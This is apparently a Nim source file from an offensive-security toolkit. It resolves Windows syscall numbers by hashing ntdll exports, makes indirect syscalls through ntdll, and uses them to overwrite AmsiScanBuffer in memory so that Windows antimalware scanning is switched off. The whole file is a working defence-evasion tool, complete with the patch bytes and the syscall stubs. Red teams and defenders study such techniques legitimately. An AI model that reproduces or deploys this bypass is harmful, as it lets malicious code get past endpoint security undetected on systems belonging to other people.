include custom
import strutils
import os
import std/dynlib
import ptr_math

# encode strings at compile time
import strenc

{.passC:"-masm=intel".}

var 
  ntProtectSyscall*: WORD
  ntWriteSyscall*: WORD
  syscallJumpAddress: ByteAddress

type
    HG_TABLE_ENTRY* = object
        pAddress*: PVOID
        dwHash*: uint64
        wSysCall*: WORD

    PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY

proc djb2_hash*(pFuncName: string): uint64 =
    var hash: uint64 = 0x5381
    for c in pFuncName:
        hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))
    return hash

proc moduleToBuffer*(pCurrentModule: PLDR_DATA_TABLE_ENTRY): PWSTR =
    return pCurrentModule.FullDllName.Buffer

proc flinkToModule*(pCurrentFlink: LIST_ENTRY): PLDR_DATA_TABLE_ENTRY =
    return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)

proc getExportTable*(pCurrentModule: PLDR_DATA_TABLE_ENTRY, pExportTable: var PIMAGE_EXPORT_DIRECTORY): bool =
    let 
        pImageBase: PVOID             = pCurrentModule.DLLBase
        pDosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](pImageBase)
        pNTHeader: PIMAGE_NT_HEADERS  = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)

    if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
        return false

    if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
        return false

    pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)

    return true

proc getTableEntry*(pImageBase: PVOID, pCurrentExportDirectory: PIMAGE_EXPORT_DIRECTORY, tableEntry: var HG_TABLE_ENTRY): bool =
    ## Resolve syscall by API hashing
    var 
        cx: DWORD = 0
        numFuncs: DWORD = pCurrentExportDirectory.NumberOfNames
    let 
        pAddrOfFunctions: ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
        pAddrOfNames: ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
        pAddrOfOrdinals: ptr UncheckedArray[WORD] = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)

    while cx < numFuncs:
        var 
            pFuncOrdinal: WORD = pAddrOfOrdinals[cx]
            pFuncName: string = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
            funcHash: uint64 = djb2_hash(pFuncName)
            funcRVA: DWORD64 = pAddrOfFunctions[pFuncOrdinal]
            pFuncAddr: PVOID = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
        
        if funcHash == tableEntry.dwHash:
            tableEntry.pAddress = pFuncAddr
            if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
            return true

        cx = cx + 1
    return false

proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
    asm """
        mov rax, qword ptr gs:[0x60]
        ret
    """

proc getSyscallInstructionAddress(ntdllModuleBaseAddr: PVOID): ByteAddress =
    ## Get The address of a syscall instruction from ntdll to make sure all syscalls go through ntdll
    echo "[*] Resolving syscall..."
    echo "[*] NTDDL Base: " & $cast[int](ntdllModuleBaseAddr).toHex
    var offset: UINT = 0
    while true:
        var currByte = cast[PDWORD](ntdllModuleBaseAddr + offset)[]
        if "050F0375" in $currByte.toHex:
            echo "[*] Found syscall in ntdll addr " & $cast[ByteAddress](ntdllModuleBaseAddr + offset).toHex & ": " & $currByte.toHex
            return cast[ByteAddress](ntdllModuleBaseAddr + offset) + sizeof(WORD)
        offset = offset + 1

    echo "[!] Did not find a syscall instruction in ntdll..."
    quit(1)

proc getNextModule*(flink: var LIST_ENTRY): PLDR_DATA_TABLE_ENTRY =
    flink = flink.Flink[]
    return flinkToModule(flink)

proc searchLoadedModules*(pCurrentPeb: PPEB, tableEntry: var HG_TABLE_ENTRY): bool =
    var 
        currFlink: LIST_ENTRY = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
        currModule: PLDR_DATA_TABLE_ENTRY = flinkToModule(currFlink)
        moduleName: string
        pExportTable: PIMAGE_EXPORT_DIRECTORY
    let 
        beginModule = currModule
    
    while true:
        moduleName = $moduleToBuffer(currModule)
        echo "[*] in module " & moduleName

        if moduleName.len() == 0 or moduleName in paramStr(0):
            currModule = getNextModule(currFlink)
            if beginModule == currModule:
                break
            continue

        if "ntdll" in moduleName.toLower():
            syscallJumpAddress = getSyscallInstructionAddress(currModule.DLLBase)

            if not getExportTable(currModule, pExportTable):
                echo "[-] Failed to get export table..."
                return false

            if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
                return true
            
            currModule = getNextModule(currFlink)
        if beginModule == currModule:
            break
    return false

proc getSyscall*(tableEntry: var HG_TABLE_ENTRY): bool =
    let currentPeb: PPEB = GetPEBAsm64()
       
    if not searchLoadedModules(currentPeb, tableEntry):
        return false

    return true

proc NtProtectVirtualMemory(ProcessHandle: Handle, BaseAddress: var PVOID, NumberOfBytesToProtect: PULONG, NewAccessProtection: ULONG, OldAccessProtection: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, `ntProtectSyscall`
        mov r11, `syscallJumpAddress`
        jmp r11
        ret
    """

proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: var PVOID, Buffer: PVOID, NumberOfBytesToWrite: ULONG, NumberOfBytesWritten: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, `ntWriteSyscall`
        mov r11, `syscallJumpAddress`
        jmp r11
        ret
    """

when isMainModule:
    var 
        protectHash: uint64 = djb2_hash("NtProtectVirtualMemory")
        ntProtect: HG_TABLE_ENTRY = HG_TABLE_ENTRY(dwHash: protectHash)

        writeHash: uint64 = djb2_hash("NtWriteVirtualMemory")
        ntWrite: HG_TABLE_ENTRY = HG_TABLE_ENTRY(dwHash: writeHash)

    if getSyscall(ntProtect) and getSyscall(ntWrite):
        ntProtectSyscall = ntProtect.wSysCall
        ntWriteSyscall = ntWrite.wSysCall

        # https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
        when defined amd64:
            echo "[*] Running in x64 process"
            const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
        elif defined i386:
            {.error: "[!] x86 not supported!" }

        var
            amsi: LibHandle
            cs: pointer
            op: ULONG
            t: DWORD

        echo "[*] loading amsi"
        amsi = loadLib("amsi")
        if isNil(amsi):
            echo "[!] Failed to load amsi.dll"
            quit(1)

        cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
        if isNil(cs):
            echo "[!] Failed to get the address of 'AmsiScanBuffer'"
            quit(1)

        var p_len = cast[ULONG](patch.len)
        var status = NtProtectVirtualMemory(GetCurrentProcess(), cs, &p_len, cast[ULONG](PAGE_EXECUTE_READWRITE), &op)
        if status == 0:
            echo "[*] Applying patch"

            var bytesWritten: ULONG
            var ret = NtWriteVirtualMemory(GetCurrentProcess(), cs, unsafeAddr patch, patch.len, addr bytesWritten)

            discard NtProtectVirtualMemory(GetCurrentProcess(), cs, &p_len, op, &t)
        else:
          echo "[!] Failed running ntprotectvirtualmemory: " & $status
